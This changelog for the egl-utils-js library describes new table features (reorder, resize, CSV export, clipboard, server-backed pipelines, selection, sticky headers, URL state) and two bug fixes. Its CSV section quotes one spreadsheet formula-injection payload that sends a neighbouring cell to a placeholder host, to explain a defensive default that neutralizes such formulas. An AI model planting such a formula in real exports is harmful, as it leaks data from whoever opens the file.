# Changelog

## 1.2.0

### Minor Changes

- 17147eb: **Column reorder** (ROADMAP 19.7, spec 06 F100,
  [ADR-0069](docs/adr/0069-an-order-is-a-permutation-and-the-ceiling-held.md)).

  `bsTable({ reorder })` makes the column order caller-visible and authoritative, with a handle
  on every header that works by **drag and by keyboard**.

  ```js
  const table = bsTable(host, {
    columns: [{ key: 'host' }, { key: 'ip' }, { key: 'seen' }],
    data: rows,
    reorder: { onReorder: (order) => save(order) },
  });
  table.setColumnOrder(load()); // and back again
  table.getColumnOrder(); // → ['seen', 'host', 'ip']
  ```

  Drag a handle and the columns swap as the pointer passes each neighbour — no drop indicator,
  because the table can show the result instead of a promise of it. The handle is also a
  focusable `role="button"`, so `ArrowLeft` / `ArrowRight` move a column one slot per press. Or
  use neither: `setColumnOrder` reaches the same model without any affordance, which is what
  F100 means by the programmatic order being authoritative.

  **The pipeline never sees the order** — which column a filter or a sort addresses has nothing
  to do with where it is drawn, so reordering is presentational and the derived view is
  untouched. **No row is rebuilt**: cells are moved, not re-created.

  `setColumnOrder` takes a full permutation; a partial list is a `TypeError` naming what is
  missing. New on a column: `movable`, which withholds the handle from a user without
  withholding the position from the caller. Reorder and resize compose — the move handle takes
  the header's leading edge, the F99 resize grip the trailing one.

  This supersedes spec 03's "drag-and-drop column reordering" non-goal, on F100's condition:
  the drag exists, and it is not the only way in.

- bb28183: **Column resize** (ROADMAP 19.6, spec 06 F99,
  [ADR-0068](docs/adr/0068-a-colgroup-a-separator-and-a-ceiling-in-sight.md)).

  `bsTable({ resize })` puts a grip on every header, driven by a pointer **and by the keyboard**,
  with widths a caller can read and restore.

  ```js
  const table = bsTable(host, {
    columns: [
      { key: 'host', label: 'Host', width: 240, minWidth: 120 },
      { key: 'act', label: '', resizable: false },
    ],
    data: rows,
    resize: { onResize: (widths) => save(widths) },
  });
  table.setColumnWidths(load()); // and back again
  ```

  **No row is re-rendered, ever.** Widths live on a `<colgroup>` — one `<col>` per column — so a
  resize writes one style property on one node that is not a row; a ten-thousand-row table costs
  what a ten-row one does, and the tests assert it by node identity rather than by counting.

  The grip is a `role="separator"` with a tab stop and `aria-valuenow`/`aria-valuemin`, the
  platform's own window-splitter pattern: arrow keys resize, `Shift` takes a coarser step, and the
  same node handles the drag — one control carrying one state, rather than a mouse affordance
  beside a keyboard one that can drift out of step.

  `table-layout: fixed` is applied at the **first change**, not when the option is enabled, so
  switching the capability on does not re-lay-out a table nobody has touched. `getColumnWidths()`
  reports the width the table _enforces_ rather than the pixel the engine painted — under a
  `width: 100%` table those differ by the container, and only the declared figure round-trips
  through `setColumnWidths` and survives a different window size. `resizable: false` withholds the
  affordance from your user, not the width from you.

  Also new on a column: `width`, `minWidth` and `resizable`. Sticky headers and resize compose.

- daec123: **CSV export and the clipboard** (ROADMAP 19.4, spec 06 F96–F97,
  [ADR-0066](docs/adr/0066-a-csv-is-not-an-inert-document.md)).

  - **`tableCsv(rows, {columns, …})`** on `egl-utils-js/table` — RFC 4180, zero-dependency, pure
    and SSR-safe: quoting only where the grammar requires it, doubled quotes inside quoted
    fields, CRLF by default and LF as an option, a configurable delimiter. It exports the rows
    you pass, so the current page, the whole source or the selection are all just a different
    argument.
  - **`copyToClipboard(text, {window})`** on `egl-utils-js/dom` — a clipboard write whose every
    refusal is typed.
  - **`ClipboardError`** (`EGL_CLIPBOARD`) on `egl-utils-js/errors` and the root, carrying
    `reason: 'unsupported' | 'insecure' | 'denied' | 'failed'`.

  **A CSV is not an inert document, and the default reflects that.** Every mainstream spreadsheet
  evaluates a cell whose text begins `=`, `+`, `-` or `@`, so a field reading
  `=HYPERLINK("http://x/?"&A1,"click")` exfiltrates the row beside it the moment the file is
  opened. Those prefixes are **neutralized by default** — with one exception that keeps the
  mitigation liveable: **a field whose whole text is a number is left alone**, because prefixing
  every negative number would corrupt whole columns to buy nothing. `neutralizeFormulas: false`
  turns it off for callers who know their consumer is a parser and not a spreadsheet.

  **A copy that did nothing must not look like one that worked.** The clipboard is
  permission-gated and secure-context-only, so `copyToClipboard` distinguishes an HTTP page
  (`'insecure'`, fixable) from a refused permission (`'denied'`, the user's to grant) from an
  engine without the API (`'unsupported'`). There is deliberately **no `execCommand`
  fallback** — it is deprecated, silently unreliable, and would restore the ambiguity this
  removes.

  Excel stays out of core (NFR-06): `tableCsv` is the extension point, and the same rows go to
  any workbook writer you choose.

- 55f1db6: **`remotePipeline` — table data from a server** (ROADMAP 19.1, spec 06 F88–F91,
  [ADR-0062](docs/adr/0062-a-sibling-not-a-wrapper.md)).

  `tablePipeline` derives a view from rows you already hold. `remotePipeline` holds the same
  question — filters, search, sort, page — and asks a server to answer it.

  ```js
  import { remotePipeline } from 'egl-utils-js/table';

  const table = remotePipeline({
    pageSize: 20,
    load: (query, signal) => api.post('orders/search', { json: query, signal }),
  });
  table.on('change', (view) => render(view.rows, { loading: view.loading, error: view.error }));
  table.setSearch('milan');
  ```

  **Same command vocabulary as `tablePipeline`** — `setFilter`, `setSearch`, `toggleSort`,
  `setSort`, `setPage`, `setPageSize`, `batch`, `on`/`once`/`off`, `view()` — plus `refresh()`
  and `destroy()`. Moving a table from local rows to a server changes where the data comes from
  and nothing your calling code has to relearn.

  **Out-of-order responses cannot show the wrong page.** A superseded load is aborted _and_ its
  result discarded even if it arrives first; an identical query does not re-issue; a failed load
  leaves the previous rows in place with the error reported beside them. The transport is
  injected, never imported, so `/table` still pulls in no `fetch` and still runs on a server.

  Also new: **`tableQuery`**, the pure serializer behind it — the pipeline's state as a plain,
  JSON-safe, transport-neutral object, stable enough to use as a cache key.

  Purely additive: `tablePipeline` is untouched, and a consumer who does not import
  `remotePipeline` pays none of its bytes.

- a0353b7: **Row selection** (ROADMAP 19.3, spec 06 F94–F95,
  [ADR-0065](docs/adr/0065-a-set-of-keys-and-the-page-it-can-see.md)).

  - **`tableSelection({rowKey, mode, initial})`** on `egl-utils-js/table` — a selection held as a
    **set of row keys**, never as a flag on a row, an index, or an object reference: keys survive
    a re-sort, a re-page and a server round-trip, which is also what makes the memory cost
    O(selected) rather than O(source). `rowKey` is required, because keying by index or identity
    is the thing that breaks silently. Pure and Node-safe: it imports no pipeline and knows
    nothing about filters, so the same selection serves `tablePipeline`, `remotePipeline`, or
    neither.
  - **`bsTable({ selection: true })`** — an opt-in leading column: checkboxes (or radios in
    `'single'` mode), a select-all header with a real **indeterminate** state, keyboard
    operability from the native control, an accessible name per row that is the row's key rather
    than "checkbox", and `data-egl-selected` plus `.table-active` on each selected row so CSS can
    style it **without the caller re-rendering**. `instance.selection` exposes the model.

  **Select-all means the current page, and only the current page.** Never "everything matching
  the filter" and never "everything in the source" — both are guesses about intent that have
  shipped as data-loss bugs. `selection.stats(rows)` reports `offPage`: how many selected rows
  are _not_ among the rows passed, which under an active filter includes rows the filter excludes.
  That is the number an "apply to selection" confirmation owes the user, and it is readable at any
  moment rather than something the caller has to track.

  **Rows that leave the source are kept, not pruned.** A selection is the user's intent; filtering
  or reloading changes what is on screen and must not change what they asked to act on. `prune()`
  is the named opt-out for the caller who genuinely wants the other policy.

  Also: `'single'` mode **refuses** `selectAll()` rather than picking a row for you, a re-select of
  an already-selected row emits nothing, and the `'change'` event carries `{keys, added, removed}`
  so a renderer can update what changed instead of everything.

- 8700d00: **Sticky table header** (ROADMAP 19.5, spec 06 F98,
  [ADR-0067](docs/adr/0067-five-declarations-and-no-scroll-listener.md)).

  `bsTable({ sticky })` keeps the header visible while the body scrolls, and **`position: sticky`
  is the entire implementation**: no scroll listener, no `requestAnimationFrame`, nothing measured
  in JavaScript. Five declarations applied once at build time, which is why it needs no new
  platform API and costs 372 bytes.

  ```js
  bsTable(host, { columns, data, responsive: true, sticky: { maxHeight: '400px' } });
  ```

  `sticky.maxHeight` bounds the responsive wrapper — what gives the body something to scroll
  inside — and adds the `overflow-y` that `.table-responsive` does not ask for. Omit it and the
  header sticks to whatever scroll container you built yourself. Passing it **without**
  `responsive` is a `TypeError` rather than a no-op: there would be no node of ours to bound, and a
  header that never sticks with nothing to explain it is the failure this refuses.

  The styles land per `<th>`, so the F95 selection column sticks along with the rest, and each cell
  gets a `--bs-*`-derived background and an inset bottom rule — a sticky cell otherwise loses its
  collapsed border and lets rows scroll through it. `aria-sort` and the sort controls behave
  exactly as they did.

- 87bf810: **Table state in the URL** (ROADMAP 19.2, spec 06 F92–F93,
  [ADR-0063](docs/adr/0063-the-url-is-the-state-and-the-page-goes-last.md)).

  A table's state is the question a user asked — which filters, which search, which sort, which
  page — and a URL is the only part of a page they can bookmark, reload, or send to a colleague.

  Three additions, no change to anything that already existed:

  - **`tableStateToParams(state, {prefix, base})`** and **`tableStateFromParams(input, {prefix})`**
    on `egl-utils-js/table` — pure, SSR-safe, and reaching no platform API but `URLSearchParams`,
    so a server render restores the state from the request's query string and derives page 3
    before any script runs. A `view()` is accepted directly, because it is a superset of the
    state. Parameters the state does not own are **preserved**; defaults are **omitted**, so a
    table at rest has a clean URL.
  - **`bindTableHistory(pipeline, options)`** on `egl-utils-js/dom` — restores from the URL on
    bind, writes on every change, restores again on `popstate`, so Back and Forward move through
    table states. `prefix` lets two tables share one URL; `mode: 'replace'` keeps the state
    addressable without leaving a trail. Works with `remotePipeline` too, where a four-part
    restore is **one** request rather than four.
  - **`TableView` gains `pageSize`** — the read model could already be asked for `pageCount`,
    which is derived from a page size the caller could not read back.

  **Nothing throws on a URL.** `?page=abc` is page 1, `size=0` is unpaginated, a malformed sort
  entry is dropped while the ones around it survive, and a parameter naming a column that no
  longer exists is skipped and then removed from the URL rather than taking the page down. A
  hand-edited link is untrusted input.

  **Fixed** ([BUG-0004](docs/bugs/2026/08/BUG-0004-view-filters-lose-a-proto-column.md)): a
  column keyed `__proto__` was filtered for real by `tablePipeline` and reported by `view()` as
  no filter at all, because the read model was built by assignment. Found by the new
  round-trip property suite, whose key generator produces the key no example test would have.

### Patch Changes

- 1d72548: **Fixed: every filter sat under its neighbour when a table had both a selection column and a
  filter row** (ROADMAP 19.9,
  [BUG-0005](docs/bugs/2026/08/BUG-0005-filter-row-misaligned-under-a-selection-column.md)).

  `bsTable({ selection, controls: { filterRow: true } })` rendered the filter row one cell
  short: the header row and every body row prepend a cell for the F95 checkbox column and the
  F67 filter row did not, so each filter input was drawn one column to the left of the column
  it filters, and the last column appeared to have no filter at all.

  Silent and visual: the wiring is by column key and stayed correct, so typing in the box under
  the checkboxes really did filter the first column — a sighted user and a screen-reader user
  were reading different tables.

  The filter row now prepends an empty `<td>` carrying the selection column's own class. A
  `<td>` rather than a `<th scope="row">`, because the cells beside it are `<td>` for a stated
  reason — they hold controls, and a header cell there would attach itself to the data below —
  and an empty cell does not change that.

  No released version was affected: the selection column arrived in the same unreleased wave.

All notable changes to `egl-utils-js` are documented here, following
[Keep a Changelog 1.1.0](https://keepachangelog.com/en/1.1.0/) and
[Semantic Versioning 2.0.0](https://semver.org/).

Every PR that introduces a user-visible change adds a line to `[Unreleased]` in the same
PR. A release PR moves the `[Unreleased]` entries into a new per-version file under
`docs/changelog/v<MAJOR>/v<X.Y.Z>.md` and adds an index row below.

## [Unreleased]

### Added

- **`remotePipeline` and `tableQuery` on `egl-utils-js/table`** — a table pipeline whose rows
  come from a server, sharing `tablePipeline`'s command vocabulary so moving a table from
  local to remote data changes where the rows come from and nothing the calling code has to
  relearn. A superseded load is aborted _and_ its result discarded even if it arrives first,
  an identical query does not re-issue (`refresh()` asks again on purpose), and a failed load
  leaves the previous rows in place with the error beside them. The transport is injected,
  never imported, so `/table` still pulls in no `fetch` (spec 06 F88–F91, ROADMAP 19.1,
  [ADR-0062](docs/adr/0062-a-sibling-not-a-wrapper.md)).
- **`tableStateToParams` and `tableStateFromParams` on `egl-utils-js/table`** — a table state
  and a query string, converted both ways, exactly. Pure and SSR-safe: a server render restores
  the state from the request's query string and derives the right page before any script runs.
  Parameters the state does not own are preserved, defaults are omitted so a table at rest has
  a clean URL, and nothing throws on the input — `page=abc` is page 1, and a malformed sort
  entry is dropped while the ones around it survive (spec 06 F92, ROADMAP 19.2,
  [ADR-0063](docs/adr/0063-the-url-is-the-state-and-the-page-goes-last.md)).
- **`bindTableHistory` on `egl-utils-js/dom`** — keeps a pipeline and the address bar in step:
  restores on bind, writes on change, restores again on `popstate`, so Back and Forward move
  through table states. `prefix` lets two tables share one URL, `mode: 'replace'` keeps the
  state shareable without leaving a trail, and a restore is one transaction — which for
  `remotePipeline` means one request rather than four (spec 06 F93, ROADMAP 19.2, ADR-0063).
- **`pageSize` on the `tablePipeline` read model** — `view()` already reported `pageCount`,
  which is derived from a page size the caller could not read back. Additive; the remote
  sibling's view has carried it since 19.1 (ADR-0063).
- **`tableSelection` on `egl-utils-js/table`** — a row selection held as a set of **row keys**,
  so it survives a re-sort, a re-page and a server round-trip, and costs O(selected) memory
  rather than O(source). `rowKey` is required: keying by index or identity is what breaks
  silently. Select-all means **the rows you hand it** — the current page of a derived view —
  and `stats(rows)` reports `offPage`, the count of selected rows that are not among them,
  which under an active filter includes the ones the filter hides. Rows leaving the source are
  **kept**, with `prune()` as the named opt-out (spec 06 F94, ROADMAP 19.3,
  [ADR-0065](docs/adr/0065-a-set-of-keys-and-the-page-it-can-see.md)).
- **`bsTable({ selection })`** — an opt-in selection column over that model: checkboxes or
  radios, a select-all header with a real **indeterminate** state, keyboard operability, an
  accessible name per row that is the row's key rather than "checkbox", and
  `data-egl-selected` plus `.table-active` on each selected row so CSS can style it without the
  caller re-rendering. `instance.selection` exposes the model (spec 06 F95, ROADMAP 19.3,
  ADR-0065).
- **`tableCsv` on `egl-utils-js/table`** — RFC 4180 CSV from the rows you pass, zero-dependency
  and SSR-safe: quoting only where the grammar requires it, CRLF by default with LF as an
  option, a configurable delimiter. **Formula injection is neutralized by default**, because a
  cell beginning `=`, `+`, `-` or `@` is executable in every mainstream spreadsheet — with the
  one exception that keeps the mitigation liveable, a field whose whole text is a number.
  `neutralizeFormulas: false` for callers whose consumer is a parser (spec 06 F96, ROADMAP 19.4,
  [ADR-0066](docs/adr/0066-a-csv-is-not-an-inert-document.md)).
- **`copyToClipboard` on `egl-utils-js/dom`**, and **`ClipboardError`** (`EGL_CLIPBOARD`) on
  `egl-utils-js/errors` and the root — a clipboard write whose every refusal is typed and
  classified: `'insecure'` (serve over HTTPS), `'denied'` (the user's to grant),
  `'unsupported'`, `'failed'`. No `execCommand` fallback, deliberately: a copy button that
  quietly did nothing looks exactly like one that worked (spec 06 F97, ROADMAP 19.4,
  ADR-0066).
- **`bsTable({ sticky })`** — the header stays visible while the body scrolls, with
  `position: sticky` as the entire implementation: no scroll listener, no
  `requestAnimationFrame`, nothing measured in JavaScript. `sticky.maxHeight` bounds the
  responsive wrapper so the body has something to scroll inside; passing it without `responsive`
  is a `TypeError` rather than a header that never sticks. The styles land per `<th>`, so the
  selection column sticks with the rest, and each cell takes a `--bs-*`-derived background and an
  inset bottom rule because a sticky cell otherwise loses its collapsed border. Sorting and
  `aria-sort` are untouched (spec 06 F98, ROADMAP 19.5,
  [ADR-0067](docs/adr/0067-five-declarations-and-no-scroll-listener.md)).
- **`bsTable({ resize })`, plus `width`, `minWidth` and `resizable` on a column** — a resize
  grip on every header, driven by a pointer **and by the keyboard**: `role="separator"` with a
  tab stop and `aria-valuenow`, so arrow keys resize and `Shift` takes a coarser step, and the
  same node handles the drag rather than a second control that can drift out of step with it.
  Widths live on a `<colgroup>`, so a resize writes one property on one node that is not a row
  and **no row is ever re-rendered**. `table-layout: fixed` is applied at the first change
  rather than when the option is enabled, so switching resize on does not re-lay-out a table
  nobody has touched. New on the instance: `getColumnWidths()` — the width the table _enforces_,
  which is what round-trips and what survives a different window size — and `setColumnWidths()`,
  clamped to the same floors as a drag. `resizable: false` withholds the affordance from a user,
  not the width from the caller (spec 06 F99, ROADMAP 19.6,
  [ADR-0068](docs/adr/0068-a-colgroup-a-separator-and-a-ceiling-in-sight.md)).
- **`bsTable({ reorder })`, plus `movable` on a column** — the column order becomes
  caller-visible and authoritative: `getColumnOrder()` / `setColumnOrder()` on the instance,
  and a handle on every header that both drags and takes the arrow keys, so a caller can build
  their own control or none at all. Dragging swaps columns live as the pointer passes each
  neighbour, with no drop indicator to clean up. The order is presentational — the F42
  pipeline never sees it — and applying one **moves cells rather than rebuilding rows**.
  `setColumnOrder` takes a full permutation and names what a partial one is missing. This
  supersedes spec 03's drag-and-drop non-goal on F100's condition: the drag exists, and it is
  not the only way in (spec 06 F100, ROADMAP 19.7,
  [ADR-0069](docs/adr/0069-an-order-is-a-permutation-and-the-ceiling-held.md)).

### Changed

### Deprecated

### Removed

### Fixed

- **A column keyed `__proto__` is now reported by `view()`** instead of vanishing from it.
  `tablePipeline` accepted `setFilter('__proto__', …)` and applied the filter for real, but
  built its `filters` read model by assignment — which routes through `Object.prototype`'s
  `__proto__` setter, so no own property was ever created and the view reported no filter on a
  column that was being filtered. Every consumer of `view().filters` was affected, including
  the new URL serialization. Found by the F92 round-trip property suite, whose key generator
  produces the key nobody would have chosen to test
  ([BUG-0004](docs/bugs/2026/08/BUG-0004-view-filters-lose-a-proto-column.md), ROADMAP 19.2).
- **The `bsTable` filter row now lines up with the columns it filters** when the table also has
  a selection column. The header row and every body row prepend a cell for the F95 checkbox
  column and the F67 filter row did not, so each filter input was drawn one column to the left
  of the column it filters and the last column appeared to have none. Silent and visual — the
  wiring is by key and stayed correct, so a sighted user and a screen-reader user were reading
  different tables. The row now prepends an empty `<td>` carrying the selection column's own
  class. Found while deciding how the F100 permutation should compute each row's leading offset
  ([BUG-0005](docs/bugs/2026/08/BUG-0005-filter-row-misaligned-under-a-selection-column.md),
  ROADMAP 19.9).

### Security

---

## Released versions

| Version | Date       | Changelog                                                  |
| ------- | ---------- | ---------------------------------------------------------- |
| v1.1.0  | 2026-08-21 | [docs/changelog/v1/v1.1.0.md](docs/changelog/v1/v1.1.0.md) |
| v1.0.0  | 2026-08-13 | [docs/changelog/v1/v1.0.0.md](docs/changelog/v1/v1.0.0.md) |
| v0.9.0  | 2026-08-09 | [docs/changelog/v0/v0.9.0.md](docs/changelog/v0/v0.9.0.md) |
| v0.8.0  | 2026-08-09 | [docs/changelog/v0/v0.8.0.md](docs/changelog/v0/v0.8.0.md) |
| v0.7.0  | 2026-08-08 | [docs/changelog/v0/v0.7.0.md](docs/changelog/v0/v0.7.0.md) |
| v0.6.0  | 2026-08-07 | [docs/changelog/v0/v0.6.0.md](docs/changelog/v0/v0.6.0.md) |
| v0.5.0  | 2026-08-07 | [docs/changelog/v0/v0.5.0.md](docs/changelog/v0/v0.5.0.md) |
| v0.4.0  | 2026-08-06 | [docs/changelog/v0/v0.4.0.md](docs/changelog/v0/v0.4.0.md) |
| v0.3.0  | 2026-08-06 | [docs/changelog/v0/v0.3.0.md](docs/changelog/v0/v0.3.0.md) |
| v0.2.0  | 2026-08-06 | [docs/changelog/v0/v0.2.0.md](docs/changelog/v0/v0.2.0.md) |
| v0.1.0  | 2026-08-03 | [docs/changelog/v0/v0.1.0.md](docs/changelog/v0/v0.1.0.md) |
